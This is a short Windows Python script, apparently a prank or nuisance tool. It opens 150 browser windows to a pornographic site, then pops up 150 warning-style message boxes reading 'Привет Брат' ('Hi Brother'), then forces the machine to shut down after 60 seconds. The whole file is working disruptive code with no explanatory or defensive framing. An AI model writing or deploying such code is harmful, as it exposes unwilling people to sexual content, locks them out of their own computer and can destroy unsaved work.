import os
import subprocess
import time
import ctypes

edge_path = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
url = "https://rt.pornhub.com"

for _ in range(150):
    subprocess.Popen([edge_path, url, "--new-window"])
    time.sleep(0.1)

for _ in range(150):
    ctypes.windll.user32.MessageBoxW(0, "Привет Брат", "Привет Брат", 0x10)
    time.sleep(0.1)

os.system("shutdown /s /t 60")